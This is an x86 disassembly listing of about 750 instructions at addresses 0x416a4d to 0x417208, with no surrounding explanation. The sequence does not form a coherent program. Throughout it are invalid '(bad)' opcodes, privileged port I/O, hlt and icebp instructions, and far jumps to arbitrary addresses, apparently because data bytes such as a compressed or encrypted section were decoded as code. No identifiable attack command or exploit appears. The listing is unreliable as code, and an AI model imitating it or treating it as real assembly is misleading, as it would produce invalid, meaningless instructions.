  416a4d:	popa   
  416a4e:	add    esi,DWORD PTR [edx-0x63]
  416a51:	nop
  416a52:	jge    0x416aca
  416a54:	mov    ebp,0x4b6e58e9
  416a59:	or     cl,BYTE PTR [ebx-0x63f0b138]
  416a5f:	mov    al,0x10
  416a61:	cmp    eax,0xcfa352f3
  416a66:	dec    eax
  416a67:	popa   
  416a68:	xchg   edi,eax
  416a69:	cmc    
  416a6a:	pop    edx
  416a6b:	loope  0x416a88
  416a6d:	test   BYTE PTR [eax],0x2b
  416a70:	lods   eax,DWORD PTR ds:[esi]
  416a71:	sahf   
  416a72:	fcom   DWORD PTR [edi]
  416a74:	mov    bl,0xfa
  416a76:	xchg   esi,eax
  416a77:	xchg   edx,eax
  416a78:	out    0xb9,al
  416a7a:	mov    al,ah
  416a7c:	or     DWORD PTR [edi],edi
  416a7e:	xor    BYTE PTR [eax-0xac19a2d],0xa3
  416a85:	push   es
  416a86:	add    edx,DWORD PTR [eax+ebx*4-0x34ea205]
  416a8d:	lods   eax,DWORD PTR ds:[esi]
  416a8e:	out    dx,al
  416a8f:	or     dh,cl
  416a91:	pusha  
  416a92:	xchg   esp,eax
  416a93:	adc    BYTE PTR [edi-0x32],bh
  416a96:	sub    dl,BYTE PTR ds:0x85489256
  416a9c:	jle    0x416abc
  416a9e:	cdq    
  416a9f:	fiadd  DWORD PTR [eax+0x4a983492]
  416aa5:	cmp    esi,DWORD PTR [ebp+edi*4-0x13]
  416aa9:	fdiv   QWORD PTR [eax]
  416aab:	sbb    al,0x12
  416aad:	ret    0x39ec
  416ab0:	sbb    eax,edi
  416ab2:	hlt    
  416ab3:	xor    DWORD PTR [eax+0x2b],ecx
  416ab6:	call   0xa8e1fea6
  416abb:	mov    ds:0x8af6145e,eax
  416ac0:	or     DWORD PTR [ecx+0x6d776386],eax
  416ac6:	popa   
  416ac7:	cld    
  416ac8:	inc    esi
  416ac9:	jnp    0x416b19
  416acb:	(bad)  
  416acc:	nop
  416acd:	pop    esp
  416ace:	pop    ebx
  416acf:	shl    eax,0x55
  416ad2:	push   eax
  416ad3:	cdq    
  416ad4:	mov    bl,0x64
  416ad6:	ficom  DWORD PTR [edx+eiz*8]
  416ad9:	enter  0xb959,0xad
  416add:	fadd   QWORD PTR [esi-0x33f27d59]
  416ae3:	fild   DWORD PTR ds:0x45aea629
  416ae9:	dec    edx
  416aea:	fs jno 0x416a74
  416aed:	shr    BYTE PTR [eax+ebp*1],cl
  416af0:	and    cl,BYTE PTR [eax-0x7bdf6994]
  416af6:	outs   dx,BYTE PTR ds:[esi]
  416af7:	jno    0x416acf
  416af9:	mov    al,ds:0x49c93698
  416afe:	cmp    eax,0xe076dac5
  416b03:	arpl   WORD PTR [ebx],cx
  416b05:	add    DWORD PTR [eax],esi
  416b07:	inc    ebx
  416b08:	pop    ebx
  416b09:	mov    bh,0xd8
  416b0b:	out    dx,eax
  416b0c:	lahf   
  416b0d:	fs inc ebp
  416b0f:	mov    cs:0x76df9623,eax
  416b15:	xchg   DWORD PTR [edi],eax
  416b17:	icebp  
  416b18:	jno    0x416b12
  416b1a:	pop    es
  416b1b:	or     DWORD PTR [ebx+0x24],0xffffffc3
  416b1f:	add    DWORD PTR [edx-0x27aa6a57],ebx
  416b25:	shl    BYTE PTR [esi-0x6f],1
  416b28:	ds push edi
  416b2a:	repnz mov cl,0x48
  416b2d:	sbb    eax,0x9df063c7
  416b32:	pop    ebx
  416b33:	icebp  
  416b34:	mov    cs,WORD PTR [ebp*1-0x7ca87258]
  416b3b:	add    DWORD PTR [ecx+0x4ce129d],edi
  416b41:	inc    ecx
  416b42:	push   ebp
  416b43:	adc    al,0x4b
  416b45:	mov    edx,0x522313f4
  416b4a:	nop
  416b4b:	cmp    bh,al
  416b4d:	in     eax,0x2e
  416b4f:	sub    eax,0x8ad3dba8
  416b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b55:	pop    esi
  416b56:	(bad)
  416b59:	cmp    al,0x8
  416b5b:	cmp    eax,0x8ad1cb93
  416b60:	pop    esi
  416b61:	fist   WORD PTR [edi-0x5a]
  416b64:	sbb    BYTE PTR [edx],0xa4
  416b67:	jae    0x416b93
  416b69:	inc    esp
  416b6a:	pushf  
  416b6b:	adc    eax,0x91ecc71b
  416b70:	and    al,0xa5
  416b72:	gs push 0x77
  416b75:	jae    0x416b93
  416b77:	rcl    bh,0x4e
  416b7a:	stc    
  416b7b:	inc    edx
  416b7c:	rcr    BYTE PTR [eax+eax*4+0x53],1
  416b80:	or     cl,BYTE PTR [esi]
  416b82:	push   es
  416b83:	lods   eax,DWORD PTR ds:[esi]
  416b84:	sub    cl,dl
  416b86:	or     BYTE PTR gs:[esi+edx*2+0x318d199],0xd4
  416b8f:	sahf   
  416b90:	jnp    0x416b52
  416b92:	rcl    BYTE PTR [edi],cl
  416b94:	sub    eax,0x14229f39
  416b99:	dec    eax
  416b9a:	in     al,0x76
  416b9c:	stos   DWORD PTR es:[edi],eax
  416b9d:	mov    cl,0x18
  416b9f:	push   esp
  416ba0:	pop    edi
  416ba1:	push   0x6e663f6c
  416ba6:	push   0x9f48f057
  416bab:	mov    cl,0x4f
  416bad:	sbb    al,0xbd
  416baf:	pop    ss
  416bb0:	rol    DWORD PTR [ebp+0x1b],0x3f
  416bb4:	repz idiv BYTE PTR [eax]
  416bb7:	sbb    ch,BYTE PTR [esi+ebp*4-0x26]
  416bbb:	push   es
  416bbc:	cmc    
  416bbd:	shl    bh,0x75
  416bc0:	aad    0x2a
  416bc2:	add    eax,0x6f961e35
  416bc7:	popa   
  416bc8:	popf   
  416bc9:	fisttp WORD PTR [edi+ecx*1]
  416bcc:	sub    edx,DWORD PTR [edi-0x497b9350]
  416bd2:	inc    edi
  416bd3:	(bad)  
  416bd4:	int3   
  416bd5:	or     esp,DWORD PTR [ebx]
  416bd7:	push   es
  416bd8:	adc    edx,esi
  416bda:	lea    edi,[esi-0xf7d852e]
  416be0:	lea    ebp,[ebp+0x17d89361]
  416be6:	out    dx,al
  416be7:	cmp    BYTE PTR [esi+0x41],ah
  416bea:	xor    al,0xb2
  416bec:	ror    DWORD PTR [esp+edx*2-0x7dfd9869],1
  416bf3:	push   ebp
  416bf4:	lods   eax,DWORD PTR ds:[esi]
  416bf5:	jge    0x416b8c
  416bf7:	daa    
  416bf8:	(bad)  
  416bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bfa:	test   eax,0x68c563fd
  416bff:	xchg   ebx,eax
  416c00:	fsubrp st(1),st
  416c02:	or     eax,0xb1e3658e
  416c07:	gs cwde 
  416c09:	scas   al,BYTE PTR es:[edi]
  416c0a:	rol    BYTE PTR [ebx+0x339c54b1],1
  416c10:	call   0x12de:0x14135302
  416c17:	sar    DWORD PTR ds:0x504268ed,cl
  416c1d:	sbb    DWORD PTR [ecx+0xb0501e8],edi
  416c23:	in     al,0xde
  416c25:	stos   BYTE PTR es:[edi],al
  416c26:	lea    ecx,[ecx+0x7f]
  416c29:	mov    dl,0xb0
  416c2b:	pop    esi
  416c2c:	test   eax,0x97cb8c46
  416c31:	cs cmc 
  416c33:	inc    ebp
  416c34:	pop    ss
  416c35:	leave  
  416c36:	adc    BYTE PTR [esi-0x90c5411],bl
  416c3c:	adc    ch,BYTE PTR [eax+0x2c]
  416c3f:	in     eax,0x83
  416c41:	pop    ecx
  416c42:	leave  
  416c43:	mov    dl,0x24
  416c45:	and    BYTE PTR ds:0x7a0b0af8,ah
  416c4b:	mov    al,0x36
  416c4d:	mov    cl,0x82
  416c4f:	mov    dh,0x26
  416c51:	cs mov cl,0xec
  416c54:	add    DWORD PTR [edi],ebx
  416c56:	sub    ch,BYTE PTR [esi-0xe]
  416c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c5a:	js     0x416c80
  416c5c:	mov    ds:0x13aad412,al
  416c61:	jmp    0x8d89:0x7a8ac674
  416c68:	pop    esi
  416c69:	pop    edx
  416c6a:	jo     0xe7adf122
  416c70:	fimul  DWORD PTR [edi+0x38]
  416c73:	sar    BYTE PTR [eax+esi*8-0x7e81530e],0x8c
  416c7b:	mov    dh,0x2d
  416c7d:	push   esi
  416c7e:	sbb    BYTE PTR [esi+edi*2],cl
  416c81:	push   0xffffffbe
  416c83:	inc    eax
  416c84:	push   ecx
  416c85:	in     al,0x3b
  416c87:	je     0x416c37
  416c89:	and    edx,DWORD PTR [edx+eax*1]
  416c8c:	ret    0x91a7
  416c8f:	gs retf 0xa27f
  416c93:	outs   dx,BYTE PTR ds:[esi]
  416c94:	jl     0x416cde
  416c96:	iret   
  416c97:	xchg   edi,eax
  416c98:	xchg   esi,eax
  416c99:	jae    0x416cd7
  416c9b:	inc    ebx
  416c9c:	xlat   BYTE PTR ds:[ebx]
  416c9d:	adc    ch,BYTE PTR [edx+0x11128697]
  416ca3:	btc    WORD PTR [ebx],bx
  416ca7:	mov    esp,0x5f001317
  416cac:	xchg   ebp,eax
  416cad:	push   0x1749a15e
  416cb2:	pop    eax
  416cb3:	lods   al,BYTE PTR ds:[esi]
  416cb4:	ror    BYTE PTR [esp+edi*4+0x19],cl
  416cb8:	pop    edx
  416cb9:	or     BYTE PTR [ebx+0x3f4fb153],cl
  416cbf:	mov    DWORD PTR [edx+0x44],esi
  416cc2:	inc    eax
  416cc3:	jge    0x416cf8
  416cc5:	cld    
  416cc6:	jge    0x416c70
  416cc8:	lea    ebp,[eax+0x3d]
  416ccb:	xchg   DWORD PTR [ebx],ecx
  416ccd:	mov    edx,0xd2b4e55a
  416cd2:	int3   
  416cd3:	adc    cl,BYTE PTR [edi+0x36]
  416cd6:	cmp    ah,BYTE PTR [esi-0x8]
  416cd9:	pop    esp
  416cda:	enter  0x990b,0x82
  416cde:	in     al,0xe6
  416ce0:	dec    esp
  416ce1:	stc    
  416ce2:	repz dec esp
  416ce4:	jg     0x416c74
  416ce6:	pop    ecx
  416ce7:	in     eax,dx
  416ce8:	shl    BYTE PTR [ebx-0x77],cl
  416ceb:	test   DWORD PTR [ebp+0x5f],edi
  416cee:	(bad)  
  416cf0:	pushf  
  416cf1:	xor    DWORD PTR [ebp-0x1c20e625],ebx
  416cf7:	mov    ch,0xf7
  416cf9:	sub    esi,DWORD PTR [edx-0x2e57b5f2]
  416cff:	push   edx
  416d00:	jns    0x416c89
  416d02:	rcl    dl,0xda
  416d05:	mov    ds:0x58cd4a6d,al
  416d0a:	fdivr  st,st(4)
  416d0c:	cmp    bh,BYTE PTR ds:0xe250c2d5
  416d12:	jno    0x416cf2
  416d14:	mov    eax,ds:0x2e2fb6b1
  416d19:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d1b:	in     eax,dx
  416d1c:	sbb    dl,BYTE PTR [edi+0x65]
  416d1f:	ja     0x416cb7
  416d21:	pop    es
  416d22:	adc    eax,DWORD PTR [ebp-0x264a4b46]
  416d28:	clc    
  416d29:	scas   eax,DWORD PTR es:[edi]
  416d2a:	mov    ah,0x51
  416d2c:	stos   DWORD PTR es:[edi],eax
  416d2d:	jne    0x416d3c
  416d2f:	add    eax,0x3bf235d2
  416d34:	adc    al,BYTE PTR [ecx+0x12]
  416d37:	fucomip st,st(0)
  416d39:	cld    
  416d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d3b:	mov    cl,BYTE PTR [edx+0x3]
  416d3e:	dec    esp
  416d3f:	les    esi,FWORD PTR [edx]
  416d41:	fwait
  416d42:	int    0x15
  416d44:	xchg   edi,eax
  416d45:	cli    
  416d46:	iret   
  416d47:	add    esi,ebx
  416d49:	lods   eax,DWORD PTR ds:[esi]
  416d4a:	xchg   ebx,eax
  416d4b:	dec    ecx
  416d4c:	mov    bl,0x29
  416d4e:	mov    edx,esp
  416d50:	ret    
  416d51:	scas   eax,DWORD PTR es:[edi]
  416d52:	push   0xffffffa4
  416d54:	jbe    0x416d5b
  416d56:	mov    dl,0xe7
  416d58:	or     ebp,edx
  416d5a:	mov    esi,0xdbc1655a
  416d5f:	aam    0x35
  416d61:	jnp    0x416d78
  416d63:	mul    cl
  416d65:	(bad)  
  416d68:	xchg   BYTE PTR ds:0x98e17c0d,ch
  416d6e:	(bad)  
  416d6f:	mov    bl,0x82
  416d71:	mov    cl,dh
  416d73:	inc    edi
  416d74:	adc    ebx,eax
  416d76:	or     dl,bl
  416d78:	inc    edi
  416d79:	push   ds
  416d7a:	add    ebp,0x7e
  416d7d:	repz mov WORD PTR [edi+0x61],es
  416d81:	sbb    al,0x8
  416d83:	pop    eax
  416d84:	mov    ecx,0x94933bea
  416d89:	push   ecx
  416d8a:	fs cmp bl,dl
  416d8d:	test   al,0x11
  416d8f:	fsubr  DWORD PTR [edi+0x2d427d9c]
  416d95:	mov    esi,0xbf1c3274
  416d9a:	jp     0x416dd1
  416d9c:	push   cs
  416d9d:	cmp    al,0x1
  416d9f:	jae    0x416d8c
  416da1:	sub    eax,0x944f017d
  416da6:	mov    edi,0x87bf9c48
  416dab:	fwait
  416dac:	sbb    eax,0x1d874ecd
  416db1:	and    ch,BYTE PTR [esi-0x7412dae2]
  416db7:	fidivr DWORD PTR [ebx]
  416db9:	add    DWORD PTR ds:0x48cedfd1,0x56
  416dc0:	sub    BYTE PTR [esi-0xf],dl
  416dc3:	inc    esi
  416dc4:	call   0xc609d98f
  416dc9:	xchg   ecx,eax
  416dca:	adc    BYTE PTR [esi-0x17],ch
  416dcd:	stos   BYTE PTR es:[edi],al
  416dce:	dec    ebp
  416dcf:	ss aaa 
  416dd1:	pmaddwd mm3,QWORD PTR [edi]
  416dd4:	ret    0x1c87
  416dd7:	(bad)  
  416dd9:	ins    BYTE PTR es:[edi],dx
  416dda:	jmp    0x327d:0x80dbbfe4
  416de1:	lahf   
  416de2:	nop
  416de3:	mov    al,0x8c
  416de5:	sub    dl,BYTE PTR [ecx-0x12]
  416de8:	out    0x65,al
  416dea:	stc    
  416deb:	jne    0x416e62
  416ded:	sbb    dl,BYTE PTR [edi+0x4decbefd]
  416df3:	retf   
  416df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416df5:	xor    ebx,DWORD PTR [ecx+edi*4+0x7d]
  416df9:	test   al,0xe4
  416dfb:	push   ebp
  416dfc:	or     bh,cl
  416dfe:	nop
  416dff:	fld    TBYTE PTR [ebx]
  416e01:	dec    esi
  416e02:	stc    
  416e03:	outs   dx,DWORD PTR ds:[esi]
  416e04:	mov    ebx,0x3225fa22
  416e09:	into   
  416e0a:	mov    ebp,0x258e422c
  416e0f:	pusha  
  416e10:	xchg   edx,eax
  416e11:	ds or  al,ah
  416e14:	adc    esi,DWORD PTR [ebx]
  416e16:	or     eax,0x81000a7
  416e1b:	sub    ecx,esi
  416e1d:	ficom  WORD PTR [ecx+0x2d]
  416e20:	repz push eax
  416e22:	inc    edx
  416e23:	xchg   edx,eax
  416e24:	xchg   edx,eax
  416e25:	xchg   esp,eax
  416e26:	dec    edx
  416e27:	mov    ss,eax
  416e29:	(bad)  
  416e2a:	pop    edx
  416e2b:	push   eax
  416e2c:	enter  0xedbb,0xe0
  416e30:	gs mov eax,0xe5979aaa
  416e36:	fadd   DWORD PTR [ecx]
  416e38:	popf   
  416e39:	push   eax
  416e3a:	imul   al
  416e3c:	sti    
  416e3d:	lods   al,BYTE PTR ds:[esi]
  416e3e:	adc    ch,dh
  416e40:	sbb    DWORD PTR [esi-0x221a5d33],ecx
  416e46:	jns    0x416eb3
  416e48:	pusha  
  416e49:	sub    BYTE PTR [esi*8-0x2670d9d5],0x6e
  416e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e53:	aad    0x7d
  416e55:	popf   
  416e56:	dec    ecx
  416e57:	in     eax,dx
  416e58:	cmp    BYTE PTR [ebx],0x80
  416e5b:	add    DWORD PTR [edi+ecx*4+0x37],ebx
  416e5f:	jmp    0x9fae9143
  416e64:	pop    ds
  416e65:	arpl   WORD PTR [esp+eax*8+0x8],ax
  416e69:	pop    eax
  416e6a:	sbb    ah,ch
  416e6c:	adc    dl,BYTE PTR [eax-0x3d4dc270]
  416e72:	js     0x416e8a
  416e74:	rol    DWORD PTR [edx-0x32421499],0x8d
  416e7b:	das    
  416e7c:	retf   0x3488
  416e7f:	in     al,0xb0
  416e81:	les    ebp,FWORD PTR [ebx]
  416e83:	adc    DWORD PTR [esi-0xb3623e0],esi
  416e89:	pushf  
  416e8a:	(bad)  
  416e8b:	xor    esp,DWORD PTR [ecx-0x3977ed3d]
  416e91:	sub    BYTE PTR [ebp+0x56],cl
  416e94:	aaa    
  416e95:	or     dh,ah
  416e97:	jbe    0x416ea6
  416e99:	not    dh
  416e9b:	retf   0x5f13
  416e9e:	jnp    0x416e7f
  416ea0:	rol    cl,0xb9
  416ea3:	push   0xffffffa9
  416ea5:	sub    DWORD PTR [ecx+0x53e4a9f3],edx
  416eab:	adc    eax,0x697b5476
  416eb0:	lods   al,BYTE PTR ds:[esi]
  416eb1:	out    dx,eax
  416eb2:	jne    0x416e99
  416eb4:	inc    edx
  416eb5:	cmc    
  416eb6:	lock pop edi
  416eb8:	xchg   ebx,eax
  416eb9:	cmp    DWORD PTR [ecx],0xdb474bc5
  416ebf:	fidiv  DWORD PTR [eax+0x3]
  416ec2:	mov    ds:0xa19cf9f9,al
  416ec7:	js     0x416eb9
  416ec9:	stc    
  416eca:	sub    DWORD PTR [ebp-0x68],ecx
  416ecd:	lods   al,BYTE PTR ds:[esi]
  416ece:	jns    0x416efd
  416ed0:	mov    edx,0x4c9b66bd
  416ed5:	mov    edx,0x8baea458
  416eda:	jo     0x416e76
  416edc:	adc    ebp,DWORD PTR [edi-0x6d]
  416edf:	push   eax
  416ee0:	retf   0x2561
  416ee3:	xchg   esp,eax
  416ee4:	leave  
  416ee5:	inc    edi
  416ee6:	ss daa 
  416ee8:	xor    DWORD PTR [edx+0x35],ebx
  416eeb:	and    eax,DWORD PTR ds:0x76912ee4
  416ef1:	mov    ebx,0xbd989fcb
  416ef6:	cmp    ecx,DWORD PTR [edi-0x45]
  416ef9:	dec    ecx
  416efa:	aad    0x65
  416efc:	jle    0x416ef3
  416efe:	aaa    
  416eff:	push   ebx
  416f00:	cmp    ecx,DWORD PTR [esi]
  416f02:	out    dx,eax
  416f03:	xchg   edx,eax
  416f04:	mov    ebx,0x47c891b5
  416f09:	mov    ebp,0x5de04ae9
  416f0e:	cmp    esi,DWORD PTR [edx+ebx*2]
  416f11:	inc    edi
  416f12:	jns    0x416eb8
  416f14:	fild   WORD PTR [esi]
  416f16:	scas   al,BYTE PTR es:[edi]
  416f17:	cmp    edi,DWORD PTR [ebp+0xcfdbb48]
  416f1d:	and    ch,BYTE PTR [eax+0x9ccf33a]
  416f23:	mov    al,BYTE PTR [esp+ebp*8+0x1168dad7]
  416f2a:	aad    0xc9
  416f2c:	push   ds
  416f2d:	inc    esi
  416f2e:	add    bh,ah
  416f30:	leave  
  416f31:	xor    al,0xae
  416f33:	and    edx,DWORD PTR [eax-0x43ecfa43]
  416f39:	and    bl,dh
  416f3b:	mov    bl,0xae
  416f3d:	push   0x68
  416f3f:	pop    edi
  416f40:	(bad)  
  416f41:	dec    ecx
  416f42:	cmp    DWORD PTR [eax],eax
  416f44:	inc    ecx
  416f45:	cmc    
  416f46:	data16 cmp ch,cl
  416f49:	test   eax,0xb7e9a3c4
  416f4e:	push   edx
  416f4f:	jnp    0x416f28
  416f51:	mov    esp,DWORD PTR [ebp+0x4a]
  416f54:	sub    al,0x19
  416f56:	jb     0x416ef2
  416f58:	inc    esp
  416f59:	mov    bl,0x37
  416f5b:	lock int 0x32
  416f5e:	(bad)  
  416f5f:	aaa    
  416f60:	inc    edx
  416f61:	pop    edi
  416f62:	cdq    
  416f63:	dec    ebp
  416f64:	outs   dx,DWORD PTR ds:[esi]
  416f65:	xor    ebx,edi
  416f67:	call   0x3084c062
  416f6c:	out    dx,al
  416f6d:	push   edx
  416f6e:	mov    ecx,0xfabcc5a5
  416f73:	cs cmc 
  416f75:	push   0x8e8dbf
  416f7a:	lea    edx,[ecx+0x4a]
  416f7d:	push   0xffffffcc
  416f7f:	sub    BYTE PTR [ecx-0x7a65a39a],cl
  416f85:	mov    eax,ds:0x363be5e1
  416f8a:	aas    
  416f8b:	scas   al,BYTE PTR es:[edi]
  416f8c:	test   al,0xe
  416f8e:	cs inc esi
  416f90:	xor    DWORD PTR [eax],ebp
  416f92:	pop    es
  416f93:	cmc    
  416f94:	mov    WORD PTR [esi],cs
  416f96:	mov    eax,DWORD PTR [edi-0x62]
  416f99:	sub    ebp,DWORD PTR [ebx]
  416f9b:	xchg   ecx,eax
  416f9c:	imul   DWORD PTR [eax+0x6f]
  416f9f:	jns    0x416f9c
  416fa1:	bound  esi,QWORD PTR [edi-0x3077fd9a]
  416fa7:	aas    
  416fa8:	es jecxz 0x416f49
  416fab:	out    dx,eax
  416fac:	loope  0x416fad
  416fae:	jb     0x416f87
  416fb0:	out    dx,eax
  416fb1:	jp     0x416fce
  416fb3:	mov    esp,0xec06f9b7
  416fb8:	pop    edi
  416fb9:	cld    
  416fba:	sub    al,0x89
  416fbc:	add    esp,DWORD PTR [eax]
  416fbe:	pop    edi
  416fbf:	jo     0x416fc1
  416fc1:	pop    edi
  416fc2:	or     eax,0xd5c3b9e7
  416fc7:	push   esi
  416fc8:	outs   dx,DWORD PTR ds:[esi]
  416fc9:	sub    esi,DWORD PTR [edi]
  416fcb:	out    0x13,al
  416fcd:	mov    ds:0x4812808f,eax
  416fd2:	lock sub al,0xce
  416fd6:	cmp    al,0xd9
  416fd8:	jmp    0x41703d
  416fda:	inc    ebx
  416fdb:	leave  
  416fdc:	mov    esi,DWORD PTR [eax]
  416fde:	dec    edx
  416fdf:	xchg   esi,eax
  416fe0:	rol    BYTE PTR [ecx+edx*1-0x58],cl
  416fe4:	jle    0x416f72
  416fe6:	push   ebx
  416fe7:	push   edx
  416fe8:	lock out 0xb2,al
  416feb:	int    0xbd
  416fed:	mov    ds:0xd5f3da11,eax
  416ff2:	jmp    0x41700e
  416ff4:	push   esi
  416ff5:	lahf   
  416ff6:	cli    
  416ff7:	imul   ebp,DWORD PTR [edx+esi*1-0x5e875e2f],0xfccb31fd
  417002:	add    al,0xbe
  417004:	out    dx,al
  417005:	les    ecx,FWORD PTR [esi]
  417007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417008:	ficom  DWORD PTR [edi-0x77]
  41700b:	add    DWORD PTR [esi+0x61e03101],ecx
  417011:	imul   esi,DWORD PTR [edx+0x5c],0xfffffffd
  417015:	mov    esp,0xc932cd47
  41701a:	xchg   edx,eax
  41701b:	inc    edi
  41701c:	es into 
  41701e:	xchg   edx,eax
  41701f:	pop    es
  417020:	inc    esp
  417021:	xchg   esi,eax
  417022:	add    eax,0x8370f436
  417027:	fiadd  DWORD PTR ds:0xf80b49d2
  41702d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702e:	ret    0x3238
  417031:	mov    al,ah
  417033:	loopne 0x417072
  417035:	inc    ebx
  417036:	jbe    0x41708c
  417038:	add    esp,edx
  41703a:	jmp    0x86d5:0x35c1759f
  417041:	fist   DWORD PTR [ebx+0x5f]
  417044:	push   esi
  417045:	mov    al,ds:0x8366747
  41704a:	pop    ebx
  41704b:	imul   edx,DWORD PTR [ebx-0x55d50780],0xc9f4ae28
  417055:	scas   eax,DWORD PTR es:[edi]
  417056:	scas   al,BYTE PTR es:[edi]
  417057:	mov    edx,0x32e9ca11
  41705c:	push   esp
  41705d:	push   0x46
  41705f:	fsub   QWORD PTR [edi]
  417061:	test   DWORD PTR [ebx+0x6de389d5],edi
  417067:	int3   
  417068:	mov    al,0xe5
  41706a:	es dec edx
  41706c:	fs and eax,0xed3fb14f
  417072:	sub    BYTE PTR [ebx-0x3a],dl
  417075:	jmp    0x41702e
  417077:	or     DWORD PTR [ebx],0x2
  41707a:	mov    ah,0x41
  41707c:	mov    gs,WORD PTR [ebx+0x6e]
  41707f:	mov    ah,0xaa
  417081:	repnz daa 
  417083:	test   eax,0x61b49480
  417088:	lods   al,BYTE PTR ds:[esi]
  417089:	xor    BYTE PTR [ecx+ecx*2],al
  41708c:	push   ebx
  41708d:	xchg   ah,dh
  41708f:	xor    DWORD PTR [esp+edx*4-0x28],edi
  417093:	pop    ebx
  417094:	jmp    0x9b0d:0x94b82a25
  41709b:	imul   ecx,edx,0xab45d2d4
  4170a1:	or     cl,BYTE PTR fs:[esi-0x1893d3f4]
  4170a8:	dec    ebx
  4170a9:	adc    al,0x21
  4170ab:	jno    0x417121
  4170ad:	outs   dx,BYTE PTR ds:[esi]
  4170ae:	(bad)  
  4170af:	(bad)  
  4170b0:	aam    0x7c
  4170b2:	popa   
  4170b3:	cmc    
  4170b4:	sub    DWORD PTR [edx+0x68e5b42],esp
  4170ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170bb:	mov    DWORD PTR [esi+0x3656b135],esp
  4170c1:	pop    eax
  4170c2:	aas    
  4170c3:	stos   BYTE PTR es:[edi],al
  4170c4:	aam    0xc9
  4170c6:	pop    edi
  4170c7:	(bad)  
  4170c8:	jbe    0x4170c6
  4170ca:	push   ss
  4170cb:	add    eax,0x3e559d0b
  4170d0:	pusha  
  4170d1:	adc    eax,0xcdeefb17
  4170d6:	sbb    ch,bh
  4170d8:	out    dx,al
  4170d9:	mov    dl,0x73
  4170db:	push   esi
  4170dc:	jge    0x41715d
  4170de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170df:	add    dh,bl
  4170e1:	xchg   edi,eax
  4170e2:	lods   al,BYTE PTR ds:[esi]
  4170e3:	idiv   BYTE PTR [ecx+edi*8+0x7]
  4170e7:	sar    DWORD PTR [edx-0x1],cl
  4170ea:	jmp    0x68fe:0xcdaeed52
  4170f1:	jbe    0x417087
  4170f3:	add    DWORD PTR [eax+0x2],esi
  4170f6:	rcl    BYTE PTR [ecx+eax*8-0x33],0xaa
  4170fb:	mov    esp,ecx
  4170fd:	and    BYTE PTR [esi+0x3b383e27],dh
  417103:	fwait
  417104:	(bad)  
  417105:	popa   
  417106:	push   es
  417107:	arpl   bx,si
  417109:	push   0xffffff94
  41710b:	sub    DWORD PTR [edi+0x7a5eab2d],edx
  417111:	sbb    esi,DWORD PTR [edi-0x285c173]
  417117:	aad    0x73
  417119:	call   0x7c16:0x7bc93fc6
  417120:	fdiv   st,st(1)
  417122:	mov    al,0xf4
  417124:	popa   
  417125:	mov    edi,0x3b365c7a
  41712a:	dec    edx
  41712b:	test   eax,0xa77428b2
  417130:	ins    BYTE PTR es:[edi],dx
  417131:	push   ebx
  417132:	call   0x802e:0xb22402dc
  417139:	and    DWORD PTR [ecx-0x306c761b],0x51adba15
  417143:	int3   
  417144:	(bad)  
  417145:	inc    DWORD PTR [edi+ebx*2+0x4d67183f]
  41714c:	outs   dx,BYTE PTR ds:[esi]
  41714d:	imul   edi,DWORD PTR [edi-0x316539e6],0xb557d57d
  417157:	cs sub al,0xed
  41715a:	pop    edx
  41715b:	call   0xed729796
  417160:	mov    edx,?
  417162:	outs   dx,DWORD PTR ds:[esi]
  417163:	xchg   DWORD PTR [esi+0x51],esp
  417166:	mov    ds:0xc68dc99a,al
  41716b:	fcom   st(2)
  41716d:	sbb    al,ah
  41716f:	xchg   edi,eax
  417170:	ret    0x207f
  417173:	int3   
  417174:	je     0x41714a
  417176:	ss ins DWORD PTR es:[edi],dx
  417178:	leave  
  417179:	fldz   
  41717b:	dec    esp
  41717c:	dec    esi
  41717d:	enter  0xfa0,0x38
  417181:	cmp    BYTE PTR [eax-0x6b70ddc1],cl
  417187:	sti    
  417188:	ret    
  417189:	loope  0x417173
  41718b:	(bad)  
  41718c:	sbb    al,0xc8
  41718e:	pop    ebp
  41718f:	xor    ebx,DWORD PTR [eax-0x80]
  417192:	int    0xe1
  417194:	or     esp,ebp
  417196:	mov    ah,0x6d
  417198:	mov    DWORD PTR [edi],0x7ca37962
  41719e:	in     eax,0x69
  4171a0:	cmp    al,0x7
  4171a2:	scas   eax,DWORD PTR es:[edi]
  4171a3:	adc    DWORD PTR fs:0x114e2222,eax
  4171aa:	stc    
  4171ab:	in     al,dx
  4171ac:	or     BYTE PTR [ebp-0x43],bh
  4171af:	rcr    BYTE PTR [edi],cl
  4171b1:	pop    ebp
  4171b2:	mov    esp,0x9799f022
  4171b7:	mov    esi,DWORD PTR [edx+edi*8+0x7b1e20b3]
  4171be:	in     eax,0x4d
  4171c0:	push   esi
  4171c1:	pop    eax
  4171c2:	xlat   BYTE PTR ds:[ebx]
  4171c3:	cwde   
  4171c4:	out    dx,ax
  4171c6:	mov    eax,cs
  4171c8:	mov    cs:0x24df3a9b,al
  4171ce:	into   
  4171cf:	xchg   esp,eax
  4171d0:	call   0x47bc3b25
  4171d5:	mov    eax,0x8cd79871
  4171da:	shl    BYTE PTR [eax+eiz*1],cl
  4171dd:	mov    bh,0x31
  4171df:	loopne 0x417177
  4171e1:	cli    
  4171e2:	push   esp
  4171e3:	icebp  
  4171e4:	pop    ecx
  4171e5:	push   ds
  4171e6:	not    cl
  4171e8:	mov    eax,ds:0x243872c
  4171ed:	inc    eax
  4171ee:	jmp    FWORD PTR [esi+0x25c04df8]
  4171f4:	mov    bh,0xe3
  4171f6:	rcr    DWORD PTR [esi],cl
  4171f8:	cwde   
  4171f9:	daa    
  4171fa:	mov    eax,ecx
  4171fc:	arpl   dx,dx
  4171fe:	xchg   BYTE PTR [ecx+edi*8],dh
  417201:	pop    ebp
  417202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417203:	mov    al,ds:0xc9f777a1
  417208:	pop    ds
